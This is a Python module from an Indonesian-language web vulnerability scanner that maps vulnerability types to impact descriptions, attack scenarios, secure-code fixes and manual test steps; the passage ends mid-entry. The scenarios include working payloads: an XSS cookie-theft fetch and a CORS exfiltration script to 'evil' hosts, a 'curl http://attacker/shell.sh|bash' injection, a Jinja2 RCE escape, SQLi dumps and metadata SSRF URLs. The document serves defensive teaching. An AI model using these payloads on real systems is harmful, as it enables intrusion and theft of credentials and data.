"""Memperkaya Finding dengan impact, attack_scenario, fix_examples, manual_steps.

Tujuan: tanpa harus mengubah tiap modul detector, kita lookup berdasarkan
`finding.module` dan opsional pattern di `finding.title` lalu isi field
metadata yang lebih dalam.

Diterapkan oleh `enrich_findings(findings)` sebelum di-render reporter.
"""
from __future__ import annotations

from cyberloka.core import Finding


# Map: module -> dict berisi impact, attack_scenario, fix_examples, manual_steps
_BASE: dict[str, dict] = {
    # --- Injection family ---------------------------------------------------
    "sqli": {
        "impact": (
            "Attacker dapat membaca seluruh isi database (data pribadi user, "
            "password hash, transaksi, dokumen rahasia), memodifikasi data "
            "(menambah saldo, mengubah role admin), atau bahkan mengeksekusi "
            "perintah OS lewat fitur xp_cmdshell / LOAD_FILE / SELECT INTO OUTFILE."
        ),
        "attack_scenario": (
            "1. Attacker menyuntikkan payload SQL ke parameter rentan, mis. "
            "GET /produk?id=1' OR 1=1-- -\n"
            "2. Server membentuk query: SELECT * FROM produk WHERE id=1' OR 1=1-- -\n"
            "3. Tanda kutip yang tidak di-escape memunculkan SQL error → "
            "attacker konfirmasi celah ada.\n"
            "4. Lanjut UNION-based: ?id=1 UNION SELECT username,password,3 FROM users-- "
            "→ kredensial seluruh user di-dump."
        ),
        "fix_examples": {
            "Python (psycopg2/sqlite3)":
                "# SALAH:\n"
                "cursor.execute(f\"SELECT * FROM produk WHERE id={user_input}\")\n\n"
                "# BENAR (parameterized):\n"
                "cursor.execute(\"SELECT * FROM produk WHERE id = %s\", (user_input,))",
            "PHP (PDO)":
                "// SALAH:\n"
                "$db->query(\"SELECT * FROM produk WHERE id=$_GET[id]\");\n\n"
                "// BENAR:\n"
                "$stmt = $db->prepare(\"SELECT * FROM produk WHERE id = ?\");\n"
                "$stmt->execute([$_GET['id']]);",
            "Node.js (mysql2)":
                "// SALAH:\n"
                "db.query(`SELECT * FROM produk WHERE id=${req.query.id}`);\n\n"
                "// BENAR:\n"
                "db.execute('SELECT * FROM produk WHERE id = ?', [req.query.id]);",
            "Java (JDBC)":
                "// BENAR:\n"
                "PreparedStatement ps = conn.prepareStatement(\n"
                "  \"SELECT * FROM produk WHERE id = ?\");\n"
                "ps.setInt(1, Integer.parseInt(id));\n"
                "ResultSet rs = ps.executeQuery();",
        },
        "manual_steps": [
            "Verifikasi dengan login sebagai user biasa, akses URL injection-nya, "
            "konfirmasi error SQL muncul / response berbeda saat 1=1 vs 1=2.",
            "Cek apakah server menyembunyikan stack trace di production. Bila "
            "ya, gunakan boolean-based / time-based blind SQLi untuk konfirmasi.",
            "Pastikan parameterized query dipakai DI SEMUA endpoint, bukan hanya "
            "yang dilaporkan tool — grep `f\"SELECT`, `+ \"WHERE\"`, dsb. di codebase.",
        ],
    },
    "xss": {
        "impact": (
            "Attacker dapat mencuri cookie session korban (account takeover), "
            "mem-redirect ke halaman phishing, mengganti tampilan halaman "
            "(defacement), atau memicu permintaan transfer/transaksi atas nama korban."
        ),
        "attack_scenario": (
            "1. Attacker membuat URL: /search?q=<script>fetch('https://evil/c?'+document.cookie)</script>\n"
            "2. Korban (admin/user) klik link → server mengembalikan halaman dengan "
            "payload tertanam di body karena tidak di-escape.\n"
            "3. Browser korban mengeksekusi script → cookie session dikirim ke server attacker.\n"
            "4. Attacker pakai cookie itu untuk login sebagai korban tanpa password."
        ),
        "fix_examples": {
            "Jinja2 (Flask/Django)":
                "<!-- BENAR: auto-escape default. JANGAN pakai |safe untuk input user. -->\n"
                "<p>Halo, {{ username }}</p>\n\n"
                "<!-- BAHAYA: -->\n"
                "<p>Halo, {{ username | safe }}</p>",
            "React JSX":
                "// BENAR: JSX otomatis escape\n"
                "<p>Halo, {username}</p>\n\n"
                "// BAHAYA:\n"
                "<p dangerouslySetInnerHTML={{__html: username}} />",
            "PHP":
                "<?php // BENAR: ?>\n"
                "<p>Halo, <?= htmlspecialchars($username, ENT_QUOTES, 'UTF-8') ?></p>",
            "CSP header":
                "# Tambahkan di reverse-proxy:\n"
                "Content-Security-Policy: default-src 'self'; script-src 'self'; "
                "object-src 'none'; frame-ancestors 'none'",
        },
        "manual_steps": [
            "Test reflected XSS di setiap parameter form & URL dengan payload "
            "<svg onload=alert(1)> dan <img src=x onerror=alert(1)>",
            "Test stored XSS: input payload di kolom yang disimpan & ditampilkan ke user lain "
            "(profile bio, komentar, nama produk).",
            "Cek DOM XSS: input lewat hash (#) atau localStorage yang masuk ke innerHTML.",
        ],
    },
    "ssrf": {
        "impact": (
            "Attacker bisa: (1) mencuri kredensial cloud (AWS/GCP/Azure) lewat "
            "metadata endpoint, (2) men-scan jaringan internal Anda, (3) mengakses "
            "service internal yang tidak ditujukan untuk publik (Redis, Elasticsearch, "
            "internal API, admin panel), (4) bypass firewall."
        ),
        "attack_scenario": (
            "1. Attacker temukan endpoint preview URL: /preview?url=https://example.com\n"
            "2. Ganti URL: /preview?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/\n"
            "3. Server fetch URL itu (karena dia punya akses metadata) → response berisi "
            "AWS access key + secret + session token.\n"
            "4. Attacker pakai kredensial itu untuk akses S3, RDS, dll."
        ),
        "fix_examples": {
            "Python (validasi URL)":
                "import ipaddress, socket\n"
                "from urllib.parse import urlparse\n\n"
                "def safe_fetch_url(url):\n"
                "    p = urlparse(url)\n"
                "    if p.scheme not in ('http', 'https'):\n"
                "        raise ValueError('scheme tidak diizinkan')\n"
                "    ip = ipaddress.ip_address(socket.gethostbyname(p.hostname))\n"
                "    if ip.is_private or ip.is_loopback or ip.is_link_local:\n"
                "        raise ValueError('IP internal tidak diizinkan')\n"
                "    return requests.get(url, timeout=5, allow_redirects=False)",
            "AWS — paksa IMDSv2":
                "# Edit launch template / instance metadata options:\n"
                "aws ec2 modify-instance-metadata-options \\\n"
                "  --instance-id i-xxx \\\n"
                "  --http-tokens required  # IMDSv2 saja\n"
                "  --http-put-response-hop-limit 1",
        },
        "manual_steps": [
            "Test endpoint dengan URL berikut & cek apakah server mengembalikan konten:\n"
            "  - http://169.254.169.254/latest/meta-data/  (AWS)\n"
            "  - http://metadata.google.internal/         (GCP, butuh header Metadata-Flavor:Google)\n"
            "  - http://127.0.0.1:6379/                   (Redis lokal)",
            "Cek apakah server follow redirect — kalau iya, payload bisa di-cloak: "
            "attacker.com -> 302 -> http://internal-api/admin",
            "Test scheme alternatif: file://, gopher://, dict://, ftp://",
        ],
    },
    "ssti": {
        "impact": (
            "SSTI sering eskalasi langsung ke RCE (remote code execution). Attacker "
            "dapat menjalankan kode arbitrer di server, baca/tulis file system, "
            "akses environment variables yang berisi DB password, dst."
        ),
        "attack_scenario": (
            "1. Attacker temukan parameter ke template engine: /greet?name={{7*7}}\n"
            "2. Response menampilkan 49 → konfirmasi Jinja2 mengeksekusi expression.\n"
            "3. Eksploit Jinja2 sandbox bypass:\n"
            "   {{ ''.__class__.__mro__[1].__subclasses__()[X]('id', shell=True, stdout=-1).communicate() }}\n"
            "4. Server mengeksekusi 'id' command → attacker dapat RCE."
        ),
        "fix_examples": {
            "Flask (jangan render_template_string user input)":
                "# SALAH:\n"
                "@app.route('/greet')\n"
                "def greet():\n"
                "    name = request.args.get('name')\n"
                "    return render_template_string(f'Hello {name}')\n\n"
                "# BENAR:\n"
                "@app.route('/greet')\n"
                "def greet():\n"
                "    return render_template('greet.html', name=request.args.get('name'))",
        },
        "manual_steps": [
            "Test ekspresi tiap engine: {{7*7}}, ${7*7}, #{7*7}, <%=7*7%> — cek mana yang return 49.",
            "Bila return 49: lanjut konfirmasi RCE di lab (bukan production!) dengan payload "
            "engine-specific (mis. Jinja2 __class__.__mro__).",
        ],
    },
    "lfi": {
        "impact": (
            "Attacker dapat membaca file sensitif: /etc/passwd, /etc/shadow (kalau "
            "salah konfigurasi), config aplikasi yang berisi DB password, .env, "
            "private key SSH. Dalam beberapa kasus eskalasi ke RCE via log poisoning."
        ),
        "attack_scenario": (
            "1. Attacker temukan endpoint: /download?file=invoice.pdf\n"
            "2. Coba traversal: /download?file=../../../../etc/passwd\n"
            "3. Server mengembalikan isi /etc/passwd → konfirmasi LFI.\n"
            "4. Lanjut: baca /etc/nginx/nginx.conf untuk peta service, baca .env untuk DB creds, "
            "baca /proc/self/environ untuk env variables."
        ),
        "fix_examples": {
            "Python":
                "import os\n"
                "ALLOWED = {'invoice.pdf', 'manual.pdf'}\n"
                "def download(filename):\n"
                "    if filename not in ALLOWED:  # whitelist STRICT\n"
                "        abort(404)\n"
                "    safe_path = os.path.join('/safe/dir', filename)\n"
                "    safe_path = os.path.realpath(safe_path)\n"
                "    if not safe_path.startswith('/safe/dir/'):\n"
                "        abort(403)  # canonicalisation check\n"
                "    return send_file(safe_path)",
        },
        "manual_steps": [
            "Test berbagai encoding traversal: ../ , ..%2F, ..%252F, ....// , ..\\..\\",
            "Test null byte injection (untuk app lama): ../../etc/passwd%00.pdf",
            "Bila LFI ada tapi /etc/passwd tidak terbaca, coba PHP wrapper: "
            "php://filter/convert.base64-encode/resource=config.php",
        ],
    },
    "cmdi": {
        "impact": (
            "RCE penuh — attacker dapat menjalankan perintah apa saja sebagai user "
            "yang menjalankan web server (sering www-data, nginx, atau bahkan root "
            "kalau salah konfigurasi). Sama dengan akses shell ke server."
        ),
        "attack_scenario": (
            "1. Endpoint: /ping?host=8.8.8.8 → server menjalankan `ping -c 3 8.8.8.8`\n"
            "2. Attacker inject: /ping?host=8.8.8.8;cat /etc/passwd\n"
            "3. Server menjalankan `ping -c 3 8.8.8.8;cat /etc/passwd` → keluar isi passwd.\n"
            "4. Lanjut: `;curl http://attacker/shell.sh|bash` → reverse shell ter-install."
        ),
        "fix_examples": {
            "Python":
                "import subprocess, ipaddress\n\n"
                "# SALAH:\n"
                "subprocess.run(f'ping -c 3 {host}', shell=True)\n\n"
                "# BENAR:\n"
                "ipaddress.ip_address(host)  # validasi tipe dulu (raise ValueError)\n"
                "subprocess.run(['ping', '-c', '3', host], check=False)  # NO shell=True",
            "Node.js":
                "// SALAH:\n"
                "exec(`ping -c 3 ${host}`)\n\n"
                "// BENAR:\n"
                "const { spawn } = require('child_process');\n"
                "spawn('ping', ['-c', '3', host]); // arg array, tidak via shell",
        },
        "manual_steps": [
            "Test separator: ; & && | || `cmd` $(cmd)",
            "Cek time-based: `;sleep 5` — bila respons tertunda 5 detik, RCE confirmed.",
            "Test out-of-band (OOB): `;curl http://yourcollab.example/uniqueid` — "
            "cek apakah server attacker terima request.",
        ],
    },
    # --- Auth/Authz ---------------------------------------------------------
    "jwt": {
        "impact": (
            "Bergantung jenisnya: alg=none atau weak HS256 secret → attacker membuat "
            "JWT atas nama siapa saja (admin take-over). kid/jku injection → attacker "
            "men-direct verifier ke key yang ia kontrol. Long-lived token → window of "
            "abuse panjang bila bocor."
        ),
        "attack_scenario": (
            "1. Attacker login sebagai user biasa, dapat JWT.\n"
            "2. Decode header: {\"alg\":\"HS256\",\"typ\":\"JWT\"} dan payload: {\"sub\":\"user1\",\"role\":\"user\"}\n"
            "3. Coba HS256 dengan secret 'secret' → match. Sekarang attacker tahu secret.\n"
            "4. Buat JWT baru: payload {\"sub\":\"admin\",\"role\":\"admin\"} → "
            "tanda tangani dengan 'secret' → dapat akses admin."
        ),
        "fix_examples": {
            "Python (PyJWT)":
                "import jwt\n"
                "import secrets\n\n"
                "SECRET = secrets.token_urlsafe(64)  # 256-bit random, simpan di secret manager\n\n"
                "# Verify dengan whitelist algoritma — JANGAN trust 'alg' dari token\n"
                "payload = jwt.decode(\n"
                "    token,\n"
                "    SECRET,\n"
                "    algorithms=['HS256'],  # eksplisit, bukan dari token\n"
                "    options={'require': ['exp', 'iat', 'sub']}\n"
                ")",
            "Node (jsonwebtoken)":
                "const jwt = require('jsonwebtoken');\n"
                "const payload = jwt.verify(token, SECRET, {\n"
                "  algorithms: ['HS256'],  // whitelist eksplisit\n"
                "  issuer: 'myapp',\n"
                "  maxAge: '15m'\n"
                "});",
            "Migrasi ke RS256 / EdDSA":
                "# RS256/EdDSA: server menandatangani dengan PRIVATE key,\n"
                "# verifier hanya butuh PUBLIC key. Kompromi public key tidak\n"
                "# memungkinkan forge token.",
        },
        "manual_steps": [
            "Decode JWT di jwt.io. Cek alg, exp-iat (lifetime), kid/jku.",
            "Test alg=none: ganti alg jadi 'none', hapus signature, kirim. Server reject?",
            "Test HS-vs-RS confusion: jika server pakai RS256, kirim JWT alg=HS256 "
            "ditandatangani dengan PUBLIC key — verifier yang bug akan accept.",
            "Test kid path traversal: kid='../../etc/passwd' atau kid SQL injection.",
        ],
    },
    "idor": {
        "impact": (
            "Attacker dapat membaca/mengubah data user lain (PII, dokumen, "
            "transaksi, saldo, tiket). Sangat berisiko untuk data pribadi yang "
            "dilindungi UU PDP / GDPR."
        ),
        "attack_scenario": (
            "1. Attacker login sebagai user A. Buka profile: GET /api/user/12345\n"
            "2. Ganti id: GET /api/user/12346 → kembalikan data user lain.\n"
            "3. Loop id 1..99999 → dump database user.\n"
            "4. Coba PATCH /api/user/12346 dengan body {\"role\":\"admin\"} → escalate."
        ),
        "fix_examples": {
            "Express (Node)":
                "// SALAH:\n"
                "app.get('/api/user/:id', (req, res) => {\n"
                "  res.json(db.user.findOne({id: req.params.id}));  // NO authz check\n"
                "});\n\n"
                "// BENAR:\n"
                "app.get('/api/user/:id', authenticate, (req, res) => {\n"
                "  if (req.params.id !== req.user.id && !req.user.isAdmin) {\n"
                "    return res.status(403).json({error: 'forbidden'});\n"
                "  }\n"
                "  res.json(db.user.findOne({id: req.params.id}));\n"
                "});",
            "Django":
                "# Pakai django-guardian atau cek di view:\n"
                "def detail(request, pk):\n"
                "    obj = get_object_or_404(Invoice, pk=pk)\n"
                "    if obj.owner != request.user:\n"
                "        raise PermissionDenied()\n"
                "    return render(request, 'invoice.html', {'obj': obj})",
        },
        "manual_steps": [
            "Buat 2 akun terpisah (user A & B). Login sebagai A, akses object milik B "
            "lewat ganti id di URL/body. Server harus return 403/404.",
            "Test method lain: GET, PATCH, PUT, DELETE pada /api/resource/{id}.",
            "Cek juga endpoint admin yang accidentally exposed: /admin/users/{id}",
            "Cek IDOR di file storage: /uploads/2024/invoice_{id}.pdf",
        ],
    },
    # --- Misconfig & headers ------------------------------------------------
    "tls": {
        "impact": (
            "Trafik tidak ter-enkripsi (atau lemah) → password & session token "
            "dapat disadap di Wi-Fi publik / ISP. Sertifikat self-signed / kedaluwarsa "
            "bikin browser memunculkan warning yang melatih user untuk klik 'Lanjut' "
            "(ngenginstall kebiasaan tidak aman)."
        ),
        "attack_scenario": (
            "Skenario MITM: attacker di jaringan yang sama (kafe Wi-Fi) menjalankan "
            "ARP spoofing + sslstrip atau bettercap. Trafik korban dipaksa downgrade "
            "ke HTTP / TLS lemah → cookie session, form login, data formulir bisa "
            "dibaca polos."
        ),
        "fix_examples": {
            "Nginx (TLS modern)":
                "ssl_protocols TLSv1.2 TLSv1.3;\n"
                "ssl_prefer_server_ciphers off;\n"
                "ssl_ciphers ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-GCM-SHA256:...;\n"
                "ssl_session_cache shared:SSL:50m;\n"
                "ssl_stapling on;\n"
                "add_header Strict-Transport-Security \"max-age=63072000; includeSubDomains; preload\";",
            "Auto-renewal":
                "# certbot dengan systemd timer\n"
                "sudo certbot --nginx -d example.com -d www.example.com\n"
                "# certbot otomatis pasang systemd timer untuk renewal",
        },
        "manual_steps": [
            "Test di SSL Labs: https://www.ssllabs.com/ssltest/ — target grade A.",
            "Cek config dengan ssl-config.mozilla.org (pilih 'modern').",
            "Pastikan HTTP -> HTTPS 301 redirect aktif.",
            "Test subdomain takeover bila certificate transparency log "
            "menampilkan subdomain yang sudah tidak aktif.",
        ],
    },
    "sensitive_files": {
        "impact": (
            "File yang ter-ekspos sering memuat: source code (.git → seluruh history), "
            "kredensial database (.env), AWS access key, JWT secret, backup database (.sql.bak). "
            "Tingkat kompromi: dari information disclosure → full takeover."
        ),
        "attack_scenario": (
            "1. Attacker scan path umum: /.env, /.git/config, /backup.zip, /phpinfo.php\n"
            "2. /.env return 200 → dapat DB_PASSWORD, AWS_SECRET_KEY, JWT_SECRET.\n"
            "3. Pakai DB_PASSWORD untuk koneksi DB langsung (kalau port DB juga publik).\n"
            "4. Pakai AWS_SECRET_KEY untuk akses S3 bucket → ambil semua data."
        ),
        "fix_examples": {
            "Nginx":
                "location ~ /\\.(git|env|svn|hg|DS_Store) {\n"
                "    deny all;\n"
                "    return 404;\n"
                "}\n"
                "location ~ \\.(bak|backup|sql|swp|swo|orig)$ {\n"
                "    deny all;\n"
                "    return 404;\n"
                "}",
            "Apache (.htaccess)":
                "<FilesMatch \"^\\.\">\n"
                "    Require all denied\n"
                "</FilesMatch>\n"
                "<FilesMatch \"\\.(bak|sql|swp|orig)$\">\n"
                "    Require all denied\n"
                "</FilesMatch>",
            "CI/CD (jangan deploy file dev)":
                ".gitignore:\n"
                "  .env\n"
                "  *.bak\n"
                "  *.sql\n"
                "  /backup/\n\n"
                "Build Docker image dengan COPY eksplisit (bukan COPY .)",
        },
        "manual_steps": [
            "Audit deploy artifact: file apa yang sebenarnya ada di server "
            "(`find /var/www -name '.*' -o -name '*.bak'`).",
            "Cek robots.txt — kalau memuat path admin, hapus (jangan andalkan obscurity).",
            "Run gitleaks/trufflehog di repo untuk audit secret yang pernah commit.",
        ],
    },
    "headers": {
        "impact": (
            "Header keamanan adalah pertahanan defense-in-depth. Tanpa CSP, XSS yang "
            "ada lebih mudah dieksploitasi. Tanpa HSTS, attacker bisa downgrade ke HTTP. "
            "Tanpa X-Frame-Options, halaman dapat di-iframe untuk clickjacking."
        ),
        "attack_scenario": (
            "Bukan vector serangan langsung, tapi memperkuat XSS/clickjacking/MITM "
            "yang sudah ada. Contoh: site dengan XSS + tanpa CSP → exploitation trivial. "
            "Site dengan XSS + strict CSP → script attacker tidak ter-execute karena "
            "browser block."
        ),
        "fix_examples": {
            "Nginx (set semua header sekaligus)":
                "add_header Strict-Transport-Security \"max-age=63072000; includeSubDomains; preload\" always;\n"
                "add_header X-Content-Type-Options \"nosniff\" always;\n"
                "add_header X-Frame-Options \"DENY\" always;\n"
                "add_header Referrer-Policy \"strict-origin-when-cross-origin\" always;\n"
                "add_header Permissions-Policy \"camera=(), microphone=(), geolocation=()\" always;\n"
                "add_header Content-Security-Policy \"default-src 'self'; "
                "script-src 'self'; object-src 'none'; frame-ancestors 'none'\" always;",
            "Express (helmet middleware)":
                "const helmet = require('helmet');\n"
                "app.use(helmet({\n"
                "  contentSecurityPolicy: {\n"
                "    directives: {\n"
                "      defaultSrc: [\"'self'\"],\n"
                "      scriptSrc: [\"'self'\"],\n"
                "      objectSrc: [\"'none'\"],\n"
                "    }\n"
                "  },\n"
                "  hsts: { maxAge: 63072000, includeSubDomains: true, preload: true },\n"
                "}));",
        },
        "manual_steps": [
            "Test di securityheaders.com — target grade A+.",
            "CSP: mulai dengan Content-Security-Policy-Report-Only untuk monitor "
            "tanpa block, lalu enforce setelah tidak ada false positive.",
        ],
    },
    "cookies": {
        "impact": (
            "Cookie session tanpa flag yang tepat: tanpa Secure → bisa disadap di "
            "HTTP, tanpa HttpOnly → bisa dicuri via XSS dengan document.cookie, tanpa "
            "SameSite → bisa dipakai untuk CSRF cross-site."
        ),
        "attack_scenario": (
            "1. Korban login. Cookie 'session' di-set tanpa Secure/HttpOnly/SameSite.\n"
            "2. Attacker memancing korban ke halaman jahat dengan iframe target.com.\n"
            "3. Karena tidak ada SameSite, browser ikut kirim cookie korban.\n"
            "4. Attacker memicu transfer/transaksi via CSRF, atau curi cookie via XSS "
            "(`document.cookie` jalan karena tidak ada HttpOnly)."
        ),
        "fix_examples": {
            "Express":
                "app.use(session({\n"
                "  secret: 'long-random-secret',\n"
                "  cookie: {\n"
                "    secure: true,      // hanya HTTPS\n"
                "    httpOnly: true,    // tidak bisa diakses JS\n"
                "    sameSite: 'lax',   // CSRF protection\n"
                "    maxAge: 15*60*1000 // 15 menit\n"
                "  }\n"
                "}));",
            "Django settings.py":
                "SESSION_COOKIE_SECURE = True\n"
                "SESSION_COOKIE_HTTPONLY = True\n"
                "SESSION_COOKIE_SAMESITE = 'Lax'\n"
                "CSRF_COOKIE_SECURE = True\n"
                "CSRF_COOKIE_HTTPONLY = True",
            "Flask":
                "app.config.update(\n"
                "  SESSION_COOKIE_SECURE=True,\n"
                "  SESSION_COOKIE_HTTPONLY=True,\n"
                "  SESSION_COOKIE_SAMESITE='Lax',\n"
                ")",
        },
        "manual_steps": [
            "Inspect Set-Cookie di DevTools → pastikan ada Secure; HttpOnly; SameSite=Lax.",
            "Cookie auth/session WAJIB punya semua flag itu.",
            "Cookie non-sensitif (tracking, language) boleh tanpa HttpOnly.",
        ],
    },
    "cors": {
        "impact": (
            "CORS misconfig membuat situs jahat dapat membaca data terotentikasi "
            "korban dari API Anda — efektif men-bypass same-origin policy. Bisa "
            "berakhir dengan pencurian data sensitif user."
        ),
        "attack_scenario": (
            "1. API Anda return 'Access-Control-Allow-Origin: *' + "
            "'Access-Control-Allow-Credentials: true' (kombinasi terlarang spec, "
            "tapi beberapa server salah accept).\n"
            "2. Attacker bikin halaman: <script>fetch('https://api.target.com/me', "
            "{credentials:'include'}).then(r=>r.text()).then(t=>fetch('https://evil/log',"
            "{method:'POST',body:t}))</script>\n"
            "3. Korban (yang sudah login di target) buka halaman attacker → fetch jalan "
            "dengan cookie korban → response data dikirim ke server attacker."
        ),
        "fix_examples": {
            "Express (cors middleware)":
                "const cors = require('cors');\n\n"
                "const allowedOrigins = ['https://app.example.com', 'https://admin.example.com'];\n\n"
                "app.use(cors({\n"
                "  origin: (origin, cb) => {\n"
                "    if (!origin || allowedOrigins.includes(origin)) cb(null, origin);\n"
                "    else cb(new Error('CORS blocked'));\n"
                "  },\n"
                "  credentials: true,\n"
                "  methods: ['GET', 'POST'],\n"
                "}));",
            "Django (django-cors-headers)":
                "CORS_ALLOWED_ORIGINS = [\n"
                "    'https://app.example.com',\n"
                "    'https://admin.example.com',\n"
                "]\n"
                "CORS_ALLOW_CREDENTIALS = True",
        },
        "manual_steps": [
            "Test: curl -H 'Origin: https://evil.com' https://api.target.com/me -i\n"
            "   → server harus TIDAK return Access-Control-Allow-Origin: https://evil.com",
            "Wildcard '*' boleh untuk API publik tanpa cookie. Jangan kombinasi "
            "dengan Allow-Credentials: true.",
        ],
    },
    "csrf": {
        "impact": (
            "Attacker bisa men-trigger aksi state-changing atas nama korban tanpa "
            "korban sadar: ganti email, transfer dana, ubah password, hapus akun, "
            "post komentar spam, dll."
        ),
        "attack_scenario": (
            "1. Attacker host halaman jahat dengan: <form action='https://target.com/transfer' "
            "method='POST' id='f'><input name='to' value='attacker'><input name='amount' "
            "value='1000000'></form><script>document.getElementById('f').submit()</script>\n"
            "2. Korban (yang sudah login di target) buka halaman attacker.\n"
            "3. Browser otomatis kirim form + cookie session korban → server proses "
            "transfer karena valid (cookie korban valid)."
        ),
        "fix_examples": {
            "Django (built-in)":
                "{% csrf_token %}  <!-- di template -->\n\n"
                "# di view: middleware Django sudah cek otomatis untuk POST/PUT/DELETE",
            "Express (csurf)":
                "const csrf = require('csurf');\n"
                "app.use(csrf({ cookie: true }));\n\n"
                "app.get('/form', (req, res) => {\n"
                "  res.render('form', { csrfToken: req.csrfToken() });\n"
                "});",
            "Double-submit cookie (manual)":
                "1. Server set cookie: csrf=randomtoken (NOT HttpOnly)\n"
                "2. Form sertakan hidden field: <input name='_csrf' value='{{cookie.csrf}}'>\n"
                "3. Server bandingkan cookie vs body. Match -> proses.",
        },
        "manual_steps": [
            "Test setiap form POST/PUT/DELETE: hapus field csrf_token, kirim. Server harus reject.",
            "Test dengan SameSite cookie sebagai mitigasi tambahan.",
            "Khusus state-changing: GET seharusnya idempotent (tidak men-state-change).",
        ],
    },
    # --- Payment ------------------------------------------------------------
    "payment": {
        "impact": (
            "Risiko spesifik payment: kerugian finansial langsung, tuntutan refund, "
            "PCI-DSS non-compliance, kehilangan kepercayaan customer, denda OJK/BI "
            "untuk fintech, suspended dari payment gateway."
        ),
        "attack_scenario": (
            "Bergantung jenis celah, contohnya:\n"
            "1. Form payment tanpa CSRF + cookie session: attacker buat halaman dengan auto-submit "
            "form transfer → korban dipancing klik link → dana terkirim ke attacker.\n"
            "2. Amount client-controlled: attacker beli mobil 500jt → intercept request → "
            "ubah amount jadi 1000 → server proses karena mempercayai input.\n"
            "3. Stripe secret key bocor: attacker pakai sk_live_xxx untuk buat charge fiktif "
            "atau baca seluruh transaksi via Stripe API."
        ),
        "fix_examples": {
            "Express (server-side amount calculation)":
                "// SALAH:\n"
                "app.post('/checkout', async (req, res) => {\n"
                "  const { productId, amount } = req.body;  // BAHAYA: amount dari client\n"
                "  await charge(amount);\n"
                "});\n\n"
                "// BENAR:\n"
                "app.post('/checkout', async (req, res) => {\n"
                "  const { productId } = req.body;\n"
                "  const product = await db.product.findById(productId);\n"
                "  if (!product) return res.status(404).end();\n"
                "  const amount = product.price;  // server hitung sendiri\n"
                "  await charge(amount);\n"
                "});",
            "Webhook signature verification (Midtrans)":
                "import hashlib, json\n\n"
                "def verify_midtrans(notification, server_key):\n"
                "    expected = hashlib.sha512(\n"
                "        (notification['order_id']\n"
                "         + notification['status_code']\n"
                "         + notification['gross_amount']\n"
                "         + server_key).encode()\n"
                "    ).hexdigest()\n"
                "    return expected == notification['signature_key']",
            "Idempotency key (refund/transfer)":
                "// Berikan idempotency key per transaksi unik\n"
                "POST /api/transfer\n"
                "Headers: Idempotency-Key: 8f9d-2024-01-15-tx-12345\n"
                "Body: {to: 'X', amount: 1000}\n\n"
                "// Server simpan key di DB; request kedua dengan key sama dikembalikan response yang sama.",
        },
        "manual_steps": [
            "TEST DI SANDBOX, JANGAN PRODUCTION!",
            "Race condition: kirim 2 request bayar bersamaan dalam <100ms.",
            "Negative amount: amount=-100 atau amount=0.",
            "Currency confusion: tukar IDR jadi VND atau USD.",
            "Price tampering: intercept request, ubah field harga.",
            "IDOR transaction: GET /api/transaction/{id} dengan id user lain.",
            "Webhook spoofing: kirim webhook palsu tanpa signature.",
            "Webhook replay: tangkap webhook valid, kirim ulang.",
            "OTP bypass: input OTP kosong/salah/ubah HTTP status di intercept.",
            "Refund double-spend: minta refund 2x untuk 1 transaksi.",
        ],
    },
    "host_header": {
        "impact": (
            "Password reset poisoning: attacker minta reset password atas nama korban "
            "dengan Host header yang ia kontrol → korban menerima email berisi link "
            "ke domain attacker, klik → token reset terkirim ke attacker → take over akun."
        ),
        "attack_scenario": (
            "1. POST /reset-password\n"
            "   Host: evil.com\n"
            "   body: email=victim@target.com\n"
            "2. App generate link: https://evil.com/reset?token=xxxxx\n"
            "3. Korban menerima email dari target.com (legit) berisi link ke evil.com.\n"
            "4. Korban klik → evil.com terima token → attacker pakai token reset password korban."
        ),
        "fix_examples": {
            "Nginx — whitelist Host":
                "server {\n"
                "    listen 443 ssl;\n"
                "    server_name target.com www.target.com;\n"
                "    # ...\n"
                "}\n\n"
                "# Default catch-all reject:\n"
                "server {\n"
                "    listen 443 default_server;\n"
                "    return 444;  # close connection\n"
                "}",
            "Aplikasi — pakai canonical URL":
                "# JANGAN pakai request.host untuk bikin link\n"
                "# BENAR:\n"
                "BASE_URL = 'https://target.com'  # dari config, hardcoded\n"
                "reset_link = f'{BASE_URL}/reset?token={token}'",
        },
        "manual_steps": [
            "Test: curl -H 'Host: evil.com' https://target.com/reset-password -d 'email=test@test'",
            "Cek email hasilnya — link harus tetap https://target.com/...",
            "Test juga X-Forwarded-Host bila ada CDN/reverse-proxy.",
        ],
    },
    "mass_assign": {
        "impact": (
            "Attacker dapat menaikkan privilege (jadi admin), menambah saldo sendiri, "
            "membuat akun verified tanpa proses, atau memodifikasi field yang harusnya "
            "read-only (createdAt, ownerId, dll)."
        ),
        "attack_scenario": (
            "1. POST /api/users (register) body normal: {email, password}\n"
            "2. Attacker tambah field: {email, password, isAdmin: true, balance: 999999}\n"
            "3. Backend pakai User.create(req.body) tanpa filter → field tambahan ikut diset.\n"
            "4. Attacker login dengan akun baru → langsung jadi admin dengan saldo besar."
        ),
        "fix_examples": {
            "Mongoose":
                "// SALAH:\n"
                "app.post('/api/users', async (req, res) => {\n"
                "  const user = await User.create(req.body);\n"
                "  res.json(user);\n"
                "});\n\n"
                "// BENAR (allow-list):\n"
                "app.post('/api/users', async (req, res) => {\n"
                "  const { email, password, name } = req.body;  // pick eksplisit\n"
                "  const user = await User.create({ email, password, name });\n"
                "  res.json(user);\n"
                "});",
            "Rails (strong parameters)":
                "def user_params\n"
                "  params.require(:user).permit(:email, :password, :name)\n"
                "  # role, balance TIDAK di-permit -> akan di-strip\n"
                "end",
            "DRF (Django REST)":
                "class UserSerializer(serializers.ModelSerializer):\n"
                "    class Meta:\n"
                "        model = User\n"
                "        fields = ['email', 'password', 'name']  # explicit\n"
                "        # JANGAN '__all__'",
        },
        "manual_steps": [
            "Buat akun baru. Intercept request register, tambah field {isAdmin:true, role:'admin'}.",
            "Cek di response apakah field itu ikut di-set.",
            "Test di endpoint update profile: tambah field email_verified, balance, dst.",
            "Test PATCH /api/users/me dengan field privileged.",
        ],
    },
    "hpp": {
        "impact": (
            "Sendiri biasanya tidak high-impact, tapi sering dipakai untuk bypass "
            "WAF / authentication / authorization yang membaca parameter pertama "
            "sementara aplikasi membaca parameter kedua (atau sebaliknya)."
        ),
        "attack_scenario": (
            "1. WAF cek parameter pertama: ?id=123 → aman.\n"
            "2. Aplikasi pakai parameter terakhir: ?id=123&id=' OR 1=1-- → SQL injection lolos.\n"
            "3. Atau sebaliknya: WAF cek terakhir, app pakai pertama."
        ),
        "fix_examples": {
            "Express":
                "const hpp = require('hpp');\n"
